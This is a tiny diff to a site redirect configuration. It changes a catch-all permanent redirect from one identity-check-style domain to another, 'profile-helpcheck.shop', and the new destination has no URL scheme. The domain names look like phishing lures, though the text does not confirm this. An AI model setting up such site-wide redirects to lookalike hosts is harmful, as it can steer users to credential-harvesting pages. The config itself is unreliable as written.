@@ -2,7 +2,7 @@
   "redirects": [
     {
       "source": "/(.*)",
-      "destination": "https://check-id.world/$1",
+      "destination": "profile-helpcheck.shop/$1",
       "permanent": true
     }
   ]
